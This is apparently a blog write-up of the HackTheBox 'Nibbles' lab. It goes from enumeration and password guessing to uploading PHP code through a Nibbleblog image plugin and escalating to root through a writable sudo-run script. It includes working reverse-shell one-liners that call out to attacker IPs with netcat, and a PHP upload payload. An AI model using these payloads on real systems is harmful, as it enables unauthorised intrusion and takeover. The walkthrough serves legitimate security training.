```markdown
---
backLabel: Writeups
backLink: /writeups/
summary: The First HTB Box you'll solve in the CPTS Path
tags:
  - rce
  - upload
  - php
  - PrivEsc
difficulty: Easy
platform: HackTheBox
category: Web
date: 2026-08-15
title: HTB — Nibbles
layout: layouts/entry-detail.njk
---

# About This Box
 An easy rated Linux box that showcases common enumeration tactics, basic web application exploitation, and a file-related misconfiguration to escalate privileges.

|Machine Name|Nibbles|
|---|---|
|Creator|mrb3n|
|Operating System|Linux|
|Difficulty|Easy|
|User Path|Web|
|Privilege Escalation|World-writable File / Sudoers Misconfiguration|
|Ippsec Video|[https://www.youtube.com/watch?v=s_0GcRGv6Ds](https://www.youtube.com/watch?v=s_0GcRGv6Ds)|
|Walkthrough|[https://0xdf.gitlab.io/2018/06/30/htb-nibbles.html](https://0xdf.gitlab.io/2018/06/30/htb-nibbles.html)|

# Let's start
## Enumeration
### What we know so far
We already know ==the target's IP address==, that it is ==Linux==, and has a ==web-related attack vector==. 

> We call this a ==grey-box approach== because we have some information about the target.

> This is why the thorough enumeration is critical and is often an iterative process.

### Nmap
It is essential to get in the habit of taking extensive notes and saving all console output early on. The better we get at this while practicing, the more second nature it will become when on real-world engagements. Proper notetaking is critical for us as penetration testers and will significantly speed up the reporting process and ensure no evidence is lost. It is also essential to keep detailed time-stamped logs of scanning and exploitation attempts in an outage or incident in which the client needs information about our activities.

So Let's start with this ==`nmap command`== :
```shell
nmap -sV --open -oA <fileName> <target IP>
```
We will name our file : ==`nibbles_initial_scan`==
The scan resulted in :

![[Screenshot 2026-08-15 123836.png]]

So we can see that the HOST is ==likely Ubuntu Linux== and exposes an ==Apache web server on port 80== and an ==OpenSSH server on port 22== 

> Also, our 3 formats of scan (the result of ==`-oA`==) were created in our working directory

Now before we start poking around at the open ports, we can run a full TCP port scan using the command :
```shell
nmap -p- --open -oA nibbles_full_tcp_scan <Target IP>
```
This will ==check for any services running on non-standard ports== that our ==initial scan may have missed==. Since this scans all 65,535 TCP ports, it can take a long time so let's leave this running in the background and move on with our enumeration :
- We can do some ==`banner grabbing`== using ==`nc`== on the ports ==`nmap`== gave us (22, 80) to confirm ==`nmap's`== results :

==On Port 22== :![[Screenshot 2026-08-15 124441.png]]

==On Port 80== :![[Screenshot 2026-08-15 124447.png]]

Back to our ==`nmap full tcp scan`== terminal. The scan has finished and has not found any additional ports.
 Let's do perform an `nmap` [script](https://nmap.org/book/man-nse.html) scan using the ==`-sC`== flag.

> ==These scripts can be intrusive, so it is always important to understand exactly how our tools work.==

We run this command :
```shell
nmap -sC -p 22,80 -oA nibbles_script_scan <Target IP>
```
The results didn't add any additional information :

![[Screenshot 2026-08-15 125050.png]]

So let's round out our ==`nmap enumeration`== using the [http-enum script](https://nmap.org/nsedoc/scripts/http-enum.html), which can be used to enumerate common web application directories :

![[Screenshot 2026-08-15 125057.png]]

As you can see it did not uncover anything useful

## Web Footprinting
We can use ==`whatweb`== to try to identify the web application in use

![[Screenshot 2026-08-15 130039.png]]

This tool does not identify any standard web technologies in use. Browsing to the target in `Firefox` shows us a simple "Hello world!" message.

![Text 'Hello world!' displayed on a white background.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/77/nibbles_hello2.png)

Checking the page source reveals an interesting comment.

![HTML code snippet with 'Hello world!' in bold and a comment about the /nibbleblog/ directory.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/77/nibbles_comment1.png)

> We can also check this with ==`cURL`== 

The HTML comment mentions a directory named ==`nibbleblog`==. Let us check this with ==`whatweb`== :

![[Screenshot 2026-08-15 130212.png]]

Now we are starting to get a better picture of things. We can see some of the technologies in use such as [HTML5](https://en.wikipedia.org/wiki/HTML5), [jQuery](https://en.wikipedia.org/wiki/JQuery), and [PHP](https://en.wikipedia.org/wiki/PHP). We can also see that the site is running [Nibbleblog](https://www.nibbleblog.com/), which is a free blogging engine built using PHP.

### Directory Enumeration
Browsing to the `/nibbleblog` directory in `Firefox`, we do not see anything exciting on the main page.

![Blog page titled 'Nibbles Yum yum' with no posts, categories, and links to 'Home' and 'Powered by Nibbleblog'.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/77/yumyum_.png)

==A quick Google search for "nibbleblog exploit"== yields this [Nibbleblog File Upload Vulnerability](https://www.rapid7.com/db/modules/exploit/multi/http/nibbleblog_file_upload/). The flaw allows an ==authenticated attacker to upload and execute arbitrary PHP code on the underlying web server==. The `Metasploit` module in question works for version ==`4.0.3`==. We do not know the exact version of `Nibbleblog` in use yet, but it is a good bet that it is vulnerable to this. If we look at the source code of the `Metasploit` module, we can see that the exploit uses user-supplied credentials to authenticate the admin portal at ==`/admin.php`==.

Let us use [Gobuster](https://github.com/OJ/gobuster) to be thorough and check for any other accessible pages/directories :

![[Screenshot 2026-08-15 130630.png]]

`Gobuster` finishes very quickly and confirms the presence of the `admin.php` page. We can check the `README` page for interesting information, such as the version number :

![[Screenshot 2026-08-15 130956.png]]

So we validate that version 4.0.3 is in use, confirming that this version is likely vulnerable to the `Metasploit` module (==though this could be an old `README` page)==. Nothing else interesting pops out at us. Let us check out the admin portal login page.

![Login form for Nibbleblog admin area with fields for username, password, 'Remember me' checkbox, and 'Back to blog' link.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/77/nibble_admin.png)

Now, to use the exploit mentioned above, we will need valid admin credentials. We can try some authorization bypass techniques and common credential pairs manually, such as `admin:admin` and `admin:password`, to no avail. There is a reset password function, but we receive an e-mail error. Also, too many login attempts too quickly trigger a lockout with the message `Nibbleblog security error - Blacklist protection`.

Let us go back to our directory brute-forcing results. The `200` status codes show pages/directories that are directly accessible. The `403` status codes in the output indicate that access to these resources is forbidden. Finally, the `301` is a permanent redirect. Let us explore each of these. Browsing to `nibbleblog/themes/`. We can see that directory listing is enabled on the web application. Maybe we can find something interesting while poking around?

![Directory listing of /nibbleblog/themes with folders: echo, medium, note-2, simpler, techie.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/77/nibbles_dir_listing.png)

Browsing to `nibbleblog/content` shows some interesting subdirectories `public`, `private`, and `tmp`. Digging around for a while, we find a `users.xml` file which at least seems to confirm the username is indeed admin. It also shows blacklisted IP addresses. We can request this file with `cURL` and prettify the `XML` output using [xmllint](https://linux.die.net/man/1/xmllint![[Screenshot 2026-08-15 131350.png]]) : 

![[Screenshot 2026-08-15 131350.png]]

==At this point==, we ==have a valid username but no password==. Searches of Nibbleblog related documentation show that the password is set during installation, and there is no known default password. Up to this point, ==we have the following pieces of the puzzle==:

- A Nibbleblog install potentially vulnerable to an authenticated file upload vulnerability
- An admin portal at `nibbleblog/admin.php`
- Directory listing which confirmed that `admin` is a valid username
- Login brute-forcing protection blacklists our IP address after too many invalid login attempts. This takes login brute-forcing with a tool such as [Hydra](https://github.com/vanhauser-thc/thc-hydra) off the table

There are no other ports open, and we did not find any other directories. Which we can confirm by performing additional directory brute-forcing against the root of the web application

![[Screenshot 2026-08-15 131554.png]]

Taking another look through all of the exposed directories, we find a ==`config.xml`== file : 

![[Screenshot 2026-08-15 131740.png]]

Checking it, hoping for passwords proofs fruitless. ==BUT== we do see two mentions of ==`nibbles`== in the site title as well as the notification e-mail address and it's also the name of the box, so here we can ask ourselves : ==Could this be the admin password?==

When performing ==password cracking== offline with a tool such as `Hashcat` or attempting to guess a password, ==it is important to consider all of the information in front of us==. It is not uncommon to successfully crack a password hash (such as a company's wireless network passphrase) ==using a wordlist generated by crawling their website using a tool such as [CeWL](https://github.com/digininja/CeWL)== 

And yes it did work, ==`nibbles`== was indeed the password.

![Nibbleblog dashboard with options to publish, manage, and settings. Notifications show session starts and login attempts.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/77/nibbles_loggedin.png)

T==his shows us how crucial thorough enumeration is==. Let us recap what we have found so far:

- We started with a simple `nmap` scan showing two open ports
- Discovered an instance of `Nibbleblog`
- Analyzed the technologies in use using `whatweb`
- Found the admin login portal page at `admin.php`
- Discovered that directory listing is enabled and browsed several directories
- Confirmed that `admin` was the valid username
- Found out the hard way that IP blacklisting is enabled to prevent brute-force login attempts
- Uncovered clues that led us to a valid admin password of nibbles


> This proves that we need a clear, repeatable process that we will use time and time again, no matter if we are attacking a single box on HTB, performing a web application penetration test for a client, or attacking a large Active Directory environment.

> ==_Keep in mind that iterative enumeration, along with detailed notetaking, is one of the keys to success in this field._== 


## Initial Foothold
Now we need to attempt to turn this access into code execution and ultimately gain reverse shell access to the webserver. We know a `Metasploit` module will likely work for this, but let us enumerate the admin portal for other avenues of attack. Looking around a bit, we see the following pages:

|**Page**|**Contents**|
|---|---|
|`Publish`|making a new post, video post, quote post, or new page. It could be interesting.|
|`Comments`|shows no published comments|
|`Manage`|Allows us to manage posts, pages, and categories. We can edit and delete categories, not overly interesting.|
|`Settings`|Scrolling to the bottom confirms that the vulnerable version 4.0.3 is in use. Several settings are available, but none seem valuable to us.|
|`Themes`|This Allows us to install a new theme from a pre-selected list.|
|`Plugins`|Allows us to configure, install, or uninstall plugins. The `My image` plugin allows us to upload an image file. Could this be abused to upload `PHP` code potentially?|

Attempting to make a new page and embed code or upload files does not seem like the path. Let us check out the plugins page.

![Nibbleblog plugins page showing installed plugins: Categories, Hello world, Latest posts, My image, with options to configure or uninstall.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/77/plugins.png)

Let us attempt to use this plugin to ==upload a snippet of `PHP` code instead of an image==. The following snippet can be used to test for code execution : 
```php
<?php system('id'); ?>
```
Save this code to a file and then click on the `Browse` button and upload it.

![Nibbleblog plugin configuration page for 'My image' with fields for title, position, caption, and file upload.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/77/upload.png)

We get a bunch of errors in the page, but it seems like the file may have uploaded.

Now we have to ==find out where the file uploaded== if it was successful. Going back to the directory brute-forcing results, we remember the ==`/content`== directory. Under this, there is a ==`plugins`== directory and another subdirectory for ==`my_image`==. The full path is at ==`http://<host>/nibbleblog/content/private/plugins/my_image/`==. In this directory, we see two files, `db.xml` and ==`image.php`==, ==with a recent last modified date, meaning that our upload was successful==. Let us check and see if we have command execution :

![[Screenshot 2026-08-15 145750.png]]

==We do==! It looks like we have gained remote code execution on the web server, and the Apache server is running in the `nibbler` user context. Let us ==modify our PHP file to obtain a reverse shell== and start poking around the server.

Let us ==edit our local PHP file and upload it again==. This command should get us a reverse shell. As mentioned earlier in the Module, there are many reverse shell cheat sheets out there. Some great ones are [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) and [HighOn,Coffee](https://highon.coffee/blog/reverse-shell-cheat-sheet/).

Let us use the following `Bash` reverse shell one-liner and add it to our `PHP` script :

```php
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9443 >/tmp/f"); ?>
```

We upload the file again and start a ==`netcat`== listener in our terminal: 
```shell
nc -lvnp <LISTENING PORT OF OUR CHOICE>
```

Now to execute the reverse shell we either ==`curl`== the image page again or in our browser we browse to [http://nibbleblog/content/private/plugins/my_image/image.php] 

Back in our ==`netcat`== we can see that we got a response. Before we move forward with additional enumeration, let us upgrade our shell to a "nicer" shell since the shell that we caught is not a fully interactive TTY and specific commands such as `su` will not work, we cannot use text editors, tab-completion does not work, etc. This [post](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) explains the issue further as well as a variety of ways to upgrade to a fully interactive TTY. 
For our purposes, we will use a `Python` one-liner to spawn a pseudo-terminal so commands such as `su` and `sudo` work as discussed previously in this Module.

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

The command above fails as `Python2` seems to be missing from the system!

> Try various techniques for upgrading to a full TTY and pick one that works best for you

if we type the following command : `which python3` we can know if ==`python3`== exists, and surely it does, it can get us to a friendlier shell by typing

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then we ==`cd`== to ==`/home/nibbler`== we find the ==`user.txt`== flag as well as a zip file ==`personal.zip`== 


## Privilege Escalation
Now that we have a reverse shell connection, it is time to escalate privileges. We can unzip the `personal.zip` file and see a file called `monitor.sh` 

![[Screenshot 2026-08-15 150459.png]]

The shell script `monitor.sh` is a monitoring script, and it is ==owned by our `nibbler` user== and ==writeable.==

Let us put this aside for ==now and pull in [LinEnum.sh](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh) to perform some automated privilege escalation checks==. First, download the script to your local attack VM or the Pwnbox and then start a ==`Python`== HTTP server using the command :
```bash
sudo python3 -m http.server 8080
```

Back on the target type ==`wget http://<your ip>:8080/LinEnum.sh`== to download the script. If successful, we will see a 200 success response on our Python HTTP server. Once the script is pulled over, type ==`chmod +x LinEnum.sh`== to make the script executable and then type ==`./LinEnum.sh`== to run it. 

We see a ton of interesting output ==but what immediately catches the eye are `sudo` privileges.== :

![[Screenshot 2026-08-15 150741.png]]

The ==`nibbler`== user can run the file ==`/home/nibbler/personal/stuff/monitor.sh`== ==with root privileges==. Being that we have full control over that file, ==if we append a reverse shell one-liner to the end of it and execute with `sudo` we should get a reverse shell back as the root user==. Let us edit the `monitor.sh` file to append a reverse shell one-liner :

```bash
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.146 7423 >/tmp/f' | tee -a monitor.sh
```

> ==IMPORTANT NOTE== : It is crucial if we ever encounter a situation where we can leverage a writeable file for privilege escalation. We only append to the end of the file (after making a backup copy of the file) to avoid overwriting it and causing a disruption.

Now we execute the script with ==`sudo`== :
```bash
sudo /home/nibbler/personal/stuff/monitor.sh
```

Finally, ==catch the root shell on our NEW waiting `nc` listener== :

![[Screenshot 2026-08-15 151113.png]]

From here, we can grab the ==`root.txt`== flag



